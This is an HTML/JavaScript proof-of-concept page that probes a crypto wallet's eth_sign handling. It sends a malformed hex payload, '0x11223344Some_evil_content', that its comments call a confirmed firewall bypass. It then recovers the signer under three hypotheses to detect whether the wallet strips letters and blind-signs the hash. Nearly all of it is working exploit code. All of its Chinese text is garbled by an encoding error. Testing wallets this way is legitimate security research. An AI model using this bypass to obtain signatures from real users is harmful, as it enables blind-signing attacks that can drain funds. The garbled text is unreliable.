<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>eth_sign è§£æå™¨æ¼æ´å…¨è‡ªåŠ¨ç ´è§£ PoC</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.11.1/ethers.umd.min.js"></script>
    <style>
        body { font-family: monospace; max-width: 900px; margin: 20px auto; padding: 20px; background-color: #f4f4f9; color: #333; }
        h2 { color: #2c3e50; }
        button { padding: 12px 20px; margin: 10px 10px 10px 0; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 6px; font-weight: bold; font-size: 14px;}
        button.danger { background-color: #dc3545; }
        button:disabled { background-color: #cccccc; cursor: not-allowed; color: #666;}
        #console { background: #1e1e1e; color: #00ff00; padding: 15px; border-radius: 8px; height: 500px; overflow-y: auto; white-space: pre-wrap; font-size: 13px; border: 2px solid #333; line-height: 1.5; }
        .info-box { margin-bottom: 20px; padding: 15px; background: #e9ecef; border-left: 5px solid #dc3545; border-radius: 4px; }
    </style>
</head>
<body>
    <h2>eth_sign å­—ç¬¦è§£ææ¼æ´å…¨è‡ªåŠ¨é‰´å®šå™¨</h2>
    <div class="info-box">
        <strong>æ¸—é€æµ‹è¯•æµï¼š</strong><br>
        1. æ³¨å…¥å«æœ‰å­—æ¯çš„ç•¸å½¢ Hex æ•°æ® <code>0x11223344Some_evil_content</code> ç»•è¿‡é˜²ç«å¢™ã€‚<br>
        2. æ‹¿åˆ°ç­¾ååï¼Œåœ¨å‰ç«¯å¹¶å‘ 3 ç§å¯†ç å­¦ç®—æ³•ï¼Œåæ¨é’±åŒ…åº•å±‚çš„å¤„ç†é€»è¾‘ã€‚
    </div>

    <div>
        <button id="btnConnect">1. è¿æ¥æµ‹è¯•é’±åŒ…</button>
        åœ°å€: <span id="walletAddress" style="color:#007bff; font-weight:bold;">æœªè¿æ¥</span>
    </div>

    <div style="margin-top: 15px; border-top: 1px dashed #ccc; padding-top: 15px;">
        <button id="btnExploit" class="danger" disabled>2. è§¦å‘ç»•è¿‡å¹¶è‡ªåŠ¨é‰´å®šåº•å±‚é€»è¾‘</button>
    </div>

    <h3 style="margin-top: 30px;">ç ´è§£æ§åˆ¶å°:</h3>
    <div id="console">ç­‰å¾…æ“ä½œ...</div>

    <script>
        const btnConnect = document.getElementById('btnConnect');
        const btnExploit = document.getElementById('btnExploit');
        const elAddress = document.getElementById('walletAddress');
        const elConsole = document.getElementById('console');
        let currentAccount = null;

        function log(msg) {
            elConsole.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
            elConsole.scrollTop = elConsole.scrollHeight;
        }

        btnConnect.addEventListener('click', async () => {
            if (window.ethereum) {
                try {
                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                    currentAccount = accounts[0]; 
                    elAddress.innerText = currentAccount;
                    log(`âœ… é’±åŒ…å·²è¿æ¥: ${currentAccount}`);
                    btnExploit.disabled = false;
                } catch (e) { log(`âŒ è¿æ¥å¤±è´¥: ${e.message}`); }
            }
        });

        btnExploit.addEventListener('click', async () => {
            if (!currentAccount) return;
            
            // è¿™ä¸ª Payload å·²ç»ç¡®è®¤å¯ä»¥å‡»ç©¿è¯¥é’±åŒ…çš„é˜²ç«å¢™
            const payload = "0x11223344Some_evil_content";
            
            log(`\n--- ğŸš€ å‘é€ç•¸å½¢ Payload è¿›è¡Œç»•è¿‡ ---`);
            log(`Payload: ${payload}`);
            
            try {
                const signature = await window.ethereum.request({
                    method: 'eth_sign',
                    params: [currentAccount, payload]
                });
                
                log(`ğŸš¨ [ç»•è¿‡æˆåŠŸï¼] æˆåŠŸæ‹¿åˆ°ç­¾åæ•°æ®:\n${signature}`);
                log(`\nğŸ” å¼€å§‹è‡ªåŠ¨åŒ–å¹¶å‘ç ´è§£é’±åŒ…ç­¾åé€»è¾‘...`);
                
                crackSignatureLogic(payload, signature, currentAccount.toLowerCase());

            } catch (error) {
                log(`ğŸ›¡ï¸ è¯·æ±‚è¢«æ‹¦æˆª: ${error.message}`);
            }
        });

        function crackSignatureLogic(originalPayload, signature, address) {
            if (typeof ethers === 'undefined') {
                log("âŒ ethers.js æœªåŠ è½½ï¼"); return;
            }

            let cracked = false;

            // =========================================
            // çŒœæµ‹ A: å®‰å…¨å¤„ç† (è‡ªåŠ¨å¥—ä¸Šäº† EIP-191 æ¶ˆæ¯å‰ç¼€)
            // =========================================
            try {
                const recA = ethers.verifyMessage(originalPayload, signature).toLowerCase();
                if (recA === address) {
                    log(`\nâœ… [ç»“è®º A: å®‰å…¨è½¬ç ] ç ´è§£æˆåŠŸï¼`);
                    log(`åˆ†æ: é’±åŒ…é˜²ç«å¢™è™½ç„¶æ”¾è¡Œäº†é Hex å­—ç¬¦ï¼Œä½†åº•å±‚ç­¾åæ¨¡å—å°†å…¶è§†ä¸ºäº†æ™®é€šæ–‡æœ¬å­—ç¬¦ä¸²ï¼Œå¹¶å¼ºåˆ¶åŠ äº† "\\x19Ethereum Signed Message:\\n" å‰ç¼€ã€‚`);
                    log(`å¨èƒç­‰çº§: æä½ã€‚è¿™ç¬”ç­¾åæ— æ³•è¢«ç”¨ä½œæ¶æ„çš„ç›²ç­¾äº¤æ˜“ã€‚`);
                    cracked = true;
                }
            } catch(e) {}

            if (cracked) return;

            // =========================================
            // çŒœæµ‹ B: ä¸­å±å¤„ç† (å°†æ–‡æœ¬è¿›è¡Œ Keccak256 å“ˆå¸Œåè£¸ç­¾)
            // =========================================
            try {
                const utf8Bytes = ethers.toUtf8Bytes(originalPayload);
                const hash = ethers.keccak256(utf8Bytes);
                const recB = ethers.recoverAddress(hash, signature).toLowerCase();
                if (recB === address) {
                    log(`\nâš ï¸ [ç»“è®º B: æ–‡æœ¬å“ˆå¸Œè£¸ç­¾] ç ´è§£æˆåŠŸï¼`);
                    log(`åˆ†æ: é’±åŒ…å°†æ•´ä¸²å­—ç¬¦è½¬ä¸º UTF-8 å­—èŠ‚å¹¶è¿›è¡Œäº† Keccak256 å“ˆå¸Œï¼Œç„¶åæ‰§è¡Œäº†ä¸åŠ å‰ç¼€çš„åº•å±‚ç›²ç­¾ã€‚`);
                    log(`å¨èƒç­‰çº§: ä¸­ç­‰ã€‚è™½ç„¶æ˜¯è£¸ç­¾ï¼Œä½†ç”±äºåŒ…å«äº†æ¶æ„å­—æ¯ï¼Œæ”»å‡»è€…å¾ˆéš¾å‡‘å‡ºä¸€ä¸ªåˆšå¥½èƒ½è¢«è¿™æ ·è§£æçš„æœ‰æ•ˆäº¤æ˜“å“ˆå¸Œã€‚`);
                    cracked = true;
                }
            } catch(e) {}

            if (cracked) return;

            // =========================================
            // çŒœæµ‹ C: è‡´å‘½æ¼æ´ (è‡ªåŠ¨å‰”é™¤å­—æ¯å¹¶è£¸ç­¾)
            // =========================================
            try {
                // æå–å‡ºæ‰€æœ‰åˆæ³•çš„ Hex å­—ç¬¦: 0x 11 22 33 44 e e c e
                const strippedHex = "0x11223344eece";
                // é’±åŒ…å¦‚æœå¼ºåˆ¶è½¬ç ï¼Œé€šå¸¸æ˜¯å¯¹å…¶è¿›è¡Œè¡¥é½æˆ–è€… Hash
                const hash = ethers.keccak256(strippedHex);
                const recC = ethers.recoverAddress(hash, signature).toLowerCase();
                
                if (recC === address) {
                    log(`\nğŸ’¥ [ç»“è®º C: è‡´å‘½å‰”é™¤] ç ´è§£æˆåŠŸï¼`);
                    log(`åˆ†æ: æåº¦å±é™©ï¼é’±åŒ…åº•å±‚åœ¨ç­¾åæ—¶ï¼Œè‡ªåŠ¨å¿½ç•¥äº†ä½ è¾“å…¥çš„å­—æ¯ï¼Œåªå¯¹å‰©ä¸‹çš„åˆæ³•åå…­è¿›åˆ¶å­—ç¬¦ (${strippedHex}) è¿›è¡Œäº†å“ˆå¸Œè£¸ç­¾ï¼`);
                    log(`å¨èƒç­‰çº§: æé«˜ (CVEçº§åˆ«)ï¼æ”»å‡»è€…åªéœ€åœ¨çœŸå®æ¶æ„å“ˆå¸Œæœ«å°¾åŠ ä¸Šå‡ ä¸ªå­—æ¯ï¼Œå°±èƒ½å®Œç¾ç©¿é€é˜²ç«å¢™å¹¶æ‹¿åˆ°è‡´å‘½ç­¾åã€‚`);
                    cracked = true;
                }
            } catch(e) {}

            if (!cracked) {
                log(`\nâ“ [æœªçŸ¥é€»è¾‘] ä»¥ä¸Šä¸‰ç§å¸¸è§å¤„ç†é€»è¾‘å‡æœªåŒ¹é…ã€‚è¯¥é’±åŒ…çš„å¯†ç å­¦åº•å±‚è¡Œä¸ºéå¸¸è¯¡å¼‚ï¼Œå¯èƒ½ä½¿ç”¨äº†ç‰¹æ®Šçš„å¡«å…… (Padding) è§„åˆ™ã€‚`);
            }
        }
    </script>
</body>
</html>
